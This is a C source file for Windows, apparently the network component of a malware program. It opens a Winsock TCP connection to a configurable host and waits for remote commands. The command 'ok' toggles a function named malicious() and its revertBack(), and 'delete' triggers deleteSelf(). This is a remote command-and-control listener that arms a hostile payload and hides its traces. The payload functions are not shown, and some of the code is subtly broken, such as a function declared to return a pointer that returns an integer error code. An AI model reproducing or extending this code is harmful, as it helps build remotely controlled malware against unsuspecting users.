#include <Winsock2.h>
#include <Ws2tcpip.h>

#include <shlwapi.h>

#pragma comment(lib, "Ws2_32.lib")

extern wchar_t HOST[1024];
extern wchar_t PORT[1024];

extern wchar_t DEFAULT_HOST[1024];
extern wchar_t DEFAULT_PORT[1024];

wchar_t ERR_TEXT[256] = L"Ошибка при подключении Winsock2 в методе ";

int CALLED = 0;

struct sockaddr_in* getAddress(int *addrLen)
{
    int errcode = -1;

    struct addrinfo* result = NULL;
    struct addrinfo* ptr = NULL;
    struct addrinfo hints;

	struct sockaddr_in* addr = NULL;

    ZeroMemory(&hints, sizeof(hints));

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (GetAddrInfoW((PCWSTR)HOST, (PCWSTR)PORT, &hints, &result) != 0)
    {
        errcode = WSAGetLastError();
        freeaddrinfo(result);
        WSACleanup();

        if (errcode == 11001)
        {
            wchar_t text[256] = { 0 };
            memcpy(text, ERR_TEXT, 256);
            StrCatW(text, L"GetAddrInfoW (WSAHOST_NOT_FOUND): Хост не найден.");

            MessageBoxW(0, text, 0, MB_ICONERROR);
        }
        else
        {
            wchar_t errstr[256] = { 0 };
            _itow_s(errcode, errstr, 256, 10);
            MessageBoxW(0, errstr, 0, MB_ICONERROR);
        }

        return errcode;
    }

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {
        if (ptr->ai_family == AF_INET)
        {
			addr = (struct sockaddr_in*)ptr->ai_addr;

            if (addr != NULL)
            {
                *addrLen = ptr->ai_addrlen;
                errcode = 0;
            }
        }
    }

    //freeaddrinfo(result);
    return addr;
}

int connect_socket(SOCKET s)
{
    int errcode = -1;
    struct sockaddr_in* sockaddr_ipv4;
    int addrLen = 0;

	sockaddr_ipv4 = getAddress(&addrLen);
    if (SOCKET_ERROR == (connect(s, sockaddr_ipv4, addrLen)))
    {
        errcode = WSAGetLastError();
        WSACleanup();

        if (errcode == 10061)
        {
            wchar_t text[256] = { 0 };
            memcpy(text, ERR_TEXT, 256);
            StrCatW(text, L"connect (WSAECONNREFUSED): Подключение отклонено.");
            MessageBoxW(0, text, 0, MB_ICONERROR);
        }
        else if (errcode == 10049)
        {
            wchar_t text[256] = { 0 };
            memcpy(text, ERR_TEXT, 256);
            StrCatW(text, L"connect (WSAEADDRNOTAVAIL): Неверный адрес.");
            MessageBoxW(0, text, 0, MB_ICONERROR);
        }
        else if (errcode == 10013)
        {
            wchar_t text[256] = { 0 };
            memcpy(text, ERR_TEXT, 256);
            StrCatW(text, L"connect (WSAEACCES): Заблокировано администратором.");
            MessageBoxW(0, text, 0, MB_ICONERROR);
        }
        else if (errcode == 10060)
        {
            wchar_t text[256] = { 0 };
            memcpy(text, ERR_TEXT, 256);
            StrCatW(text, L"connect (WSAETIMEDOUT): Время истекло.");
            MessageBoxW(0, text, 0, MB_ICONERROR);
        }
        else
        {
            wchar_t errstr[256] = { 0 };
            _itow_s(errcode, errstr, 256, 10);
            MessageBoxW(0, errstr, 0, MB_ICONERROR);
        }

        if ((StrCmpW(HOST, DEFAULT_HOST) != 0) || (StrCmpW(PORT, DEFAULT_PORT)))
        {
            StrCpyW(HOST, DEFAULT_HOST);
            StrCpyW(PORT, DEFAULT_PORT);

            winsock_init();
        }
        
        return errcode;
    }

    /* char buff[512] = "GET / HTTP/1.1";

    if (SOCKET_ERROR == (send(s, (char*)&buff, strlen(buff), 0)))
    {
        errcode = WSAGetLastError();
        WSACleanup();
        return errcode;
    }*/

    int actual_len = 1;
    char recvbuf[512] = { 0 };

    while (actual_len > 0)
    {
        if (SOCKET_ERROR == (actual_len = recv(s, (char*)&recvbuf, 512, 0)))
        {
            errcode = WSAGetLastError();
            closesocket(s);
            WSACleanup();

            wchar_t errstr[256] = { 0 };
            _itow_s(errcode, errstr, 256, 10);
            MessageBoxW(0, errstr, 0, MB_ICONERROR);

            return errcode;
        }

        if (strcmp(recvbuf, "ok") == 0)
        {
            if (CALLED == 0)
            {
                CALLED = 1;
                malicious();
            }
            else
            {
                CALLED = 0;
                revertBack();
            }
        }
        else if (strcmp(recvbuf, "delete") == 0)
        {
            deleteSelf();
        }
    }

    shutdown(s, SD_BOTH);
    closesocket(s);
    WSACleanup();
    errcode = 0;

    return errcode;
}

int winsock_init()
{
    int errcode = -1;

    WSADATA ws;

    if (FAILED(WSAStartup(MAKEWORD(1, 1), &ws)))
    {
        errcode = WSAGetLastError();
        WSACleanup();
        return errcode;
    }

    SOCKET s;

    if (INVALID_SOCKET == (s = socket(AF_INET, SOCK_STREAM, 0)))
    {
        errcode = WSAGetLastError();
        WSACleanup();
        return errcode;
    }

    errcode = connect_socket(s);
    WSACleanup();

    return errcode;
}